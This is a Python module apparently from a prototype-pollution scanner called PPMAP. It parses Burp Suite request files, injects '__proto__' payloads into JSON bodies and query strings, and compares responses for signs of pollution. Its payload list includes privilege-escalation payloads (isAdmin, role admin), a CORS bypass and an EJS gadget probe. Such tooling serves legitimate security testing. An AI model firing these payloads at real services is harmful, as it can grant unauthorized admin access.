"""
Burp Suite Request Parser for PPMAP
Parses raw HTTP request files (saved from Burp Suite) into usable request objects.

Usage:
    from utils.burp_parser import parse_burp_request
    
    request = parse_burp_request("request.txt")
    # request = {
    #     'method': 'POST',
    #     'url': 'https://example.com/api/user',
    #     'headers': {'Cookie': '...', 'Content-Type': 'application/json'},
    #     'body': '{"name": "test"}',
    #     'host': 'example.com',
    #     'protocol': 'https'
    # }
"""

from urllib.parse import urljoin
from typing import Dict, Optional
import json


def parse_burp_request(file_path: str, base_url: Optional[str] = None) -> Dict:
    """
    Parse a raw HTTP request file (Burp Suite format) into a dictionary.
    
    Args:
        file_path: Path to the request file
        base_url: Optional base URL to use (overrides Host header)
    
    Returns:
        Dictionary with method, url, headers, body, host, protocol
    """
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()
    
    return parse_raw_request(content, base_url)


def parse_raw_request(raw_request: str, base_url: Optional[str] = None) -> Dict:
    """
    Parse a raw HTTP request string into a dictionary.
    
    Args:
        raw_request: Raw HTTP request string
        base_url: Optional base URL to use (overrides Host header)
    
    Returns:
        Dictionary with method, url, headers, body, host, protocol
    """
    lines = raw_request.strip().split('\n')
    
    if not lines:
        raise ValueError("Empty request file")
    
    # Parse request line (e.g., "GET /path HTTP/1.1" or "POST /api/user HTTP/2")
    request_line = lines[0].strip()
    request_parts = request_line.split(' ')
    
    if len(request_parts) < 2:
        raise ValueError(f"Invalid request line: {request_line}")
    
    method = request_parts[0].upper()
    path = request_parts[1]
    protocol_version = request_parts[2] if len(request_parts) > 2 else "HTTP/1.1"
    
    # Parse headers
    headers = {}
    body_start_index = None
    
    for i, line in enumerate(lines[1:], start=1):
        line = line.strip()
        
        # Empty line indicates start of body
        if not line:
            body_start_index = i + 1
            break
        
        # Parse header line
        if ':' in line:
            key, value = line.split(':', 1)
            headers[key.strip()] = value.strip()
    
    # Extract body if present
    body = None
    if body_start_index and body_start_index < len(lines):
        body = '\n'.join(lines[body_start_index:]).strip()
    
    # Determine host and protocol
    host = headers.get('Host', '')
    
    # Check if request uses HTTP/2 (indicates HTTPS)
    if 'HTTP/2' in protocol_version.upper():
        protocol = 'https'
    else:
        # Default to https for security testing
        protocol = 'https'
    
    # Build full URL
    if base_url:
        url = urljoin(base_url, path)
    else:
        url = f"{protocol}://{host}{path}"
    
    return {
        'method': method,
        'url': url,
        'path': path,
        'headers': headers,
        'body': body,
        'host': host,
        'protocol': protocol,
        'raw': raw_request
    }


def inject_pp_payload(request: Dict, payload: Dict, injection_point: str = 'body') -> Dict:
    """
    Inject prototype pollution payload into a request.
    
    Args:
        request: Parsed request dictionary
        payload: PP payload to inject (e.g., {"__proto__": {"isAdmin": true}})
        injection_point: Where to inject ('body', 'query', 'both')
    
    Returns:
        New request dictionary with injected payload
    """
    new_request = request.copy()
    new_request['headers'] = request['headers'].copy()
    
    if injection_point in ('body', 'both') and request.get('body'):
        try:
            # Try to parse existing body as JSON
            body_json = json.loads(request['body'])
            
            # Deep merge PP payload
            if isinstance(body_json, dict):
                body_json.update(payload)
                new_request['body'] = json.dumps(body_json)
            else:
                # Body is not a dict, append payload
                new_request['body'] = json.dumps(payload)
        except json.JSONDecodeError:
            # Body is not JSON, append as query params
            pass
    
    if injection_point in ('query', 'both'):
        # Inject PP payload as query parameters
        from urllib.parse import urlparse, urlunparse
        
        parsed = urlparse(new_request['url'])
        
        # Build PP query string
        pp_params = []
        for key, value in payload.items():
            if isinstance(value, dict):
                for sub_key, sub_value in value.items():
                    pp_params.append(f"__proto__[{sub_key}]={sub_value}")
            else:
                pp_params.append(f"{key}={value}")
        
        # Append to existing query
        new_query = parsed.query
        if new_query:
            new_query += '&' + '&'.join(pp_params)
        else:
            new_query = '&'.join(pp_params)
        
        new_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))
        new_request['url'] = new_url
    
    return new_request


def get_sspp_payloads() -> list:
    """
    Get Server-Side Prototype Pollution payloads for testing.
    
    Returns:
        List of (name, payload, detection_method) tuples
    """
    return [
        # JSON Spaces Detection (PortSwigger technique)
        (
            "JSON Spaces",
            {"__proto__": {"json spaces": 10}},
            "json_spaces",
            "Response JSON will have 10-space indentation if vulnerable"
        ),
        
        # Status Code Override
        (
            "Status Code Override (510)",
            {"__proto__": {"status": 510}},
            "status_code",
            "Response status will be 510 if vulnerable"
        ),
        
        # Privilege Escalation
        (
            "isAdmin Escalation",
            {"__proto__": {"isAdmin": True}},
            "behavior",
            "User may gain admin privileges if vulnerable"
        ),
        
        # Role Escalation
        (
            "Role Escalation",
            {"__proto__": {"role": "admin"}},
            "behavior",
            "User role may change to admin if vulnerable"
        ),
        
        # Express.js specific
        (
            "Express Content-Type",
            {"__proto__": {"content-type": "application/json"}},
            "header",
            "Response Content-Type header may change if vulnerable"
        ),
        
        # CORS bypass
        (
            "CORS Bypass",
            {"__proto__": {"Access-Control-Allow-Origin": "*"}},
            "header",
            "CORS header may be added if vulnerable"
        ),
        
        # Debug mode
        (
            "Debug Mode",
            {"__proto__": {"debug": True}},
            "behavior",
            "May expose debug information if vulnerable"
        ),
        
        # EJS RCE gadget (safe detection)
        (
            "EJS Client Option",
            {"__proto__": {"client": 1}},
            "ejs",
            "EJS template may become exploitable if vulnerable"
        ),
    ]


def compare_responses(baseline: str, test: str) -> Dict:
    """
    Compare baseline and test responses to detect PP indicators.
    
    Returns:
        Dictionary with detected differences
    """
    differences = {
        'json_spaces_changed': False,
        'length_changed': False,
        'new_keys': [],
        'modified_values': [],
        'pollution_detected': False
    }
    
    # Check JSON formatting difference
    try:
        baseline_lines = baseline.strip().split('\n')
        test_lines = test.strip().split('\n')
        
        if len(test_lines) > len(baseline_lines):
            differences['json_spaces_changed'] = True
            differences['pollution_detected'] = True
    except Exception:
        pass
    
    # Check response length
    if len(test) != len(baseline):
        differences['length_changed'] = True
        len_diff = len(test) - len(baseline)
        differences['length_difference'] = len_diff
    
    # Try to compare JSON structures
    try:
        baseline_json = json.loads(baseline)
        test_json = json.loads(test)
        
        if isinstance(baseline_json, dict) and isinstance(test_json, dict):
            # Check for new keys
            baseline_keys = set(baseline_json.keys())
            test_keys = set(test_json.keys())
            new_keys = test_keys - baseline_keys
            
            if new_keys:
                differences['new_keys'] = list(new_keys)
                differences['pollution_detected'] = True
            
            # Check for modified values in existing keys
            shared_keys = baseline_keys.intersection(test_keys)
            for key in shared_keys:
                # Use string representation for comparison to avoid type issues (e.g. 0 vs 0.0)
                if str(baseline_json.get(key)) != str(test_json.get(key)):
                    differences['modified_values'].append({
                        'key': key,
                        'old': baseline_json.get(key),
                        'new': test_json.get(key)
                    })
                    differences['pollution_detected'] = True
    except json.JSONDecodeError:
        pass
    
    return differences


if __name__ == "__main__":
    # Test parsing
    test_request = """POST /api/user/address HTTP/2
Host: example.com
Content-Type: application/json
Cookie: session=abc123

{"address_line_1":"test","country":"US"}"""
    
    parsed = parse_raw_request(test_request)
    print(f"Method: {parsed['method']}")
    print(f"URL: {parsed['url']}")
    print(f"Headers: {parsed['headers']}")
    print(f"Body: {parsed['body']}")
    
    # Test injection
    pp_payload = {"__proto__": {"json spaces": 10}}
    injected = inject_pp_payload(parsed, pp_payload, 'body')
    print(f"\nInjected body: {injected['body']}")
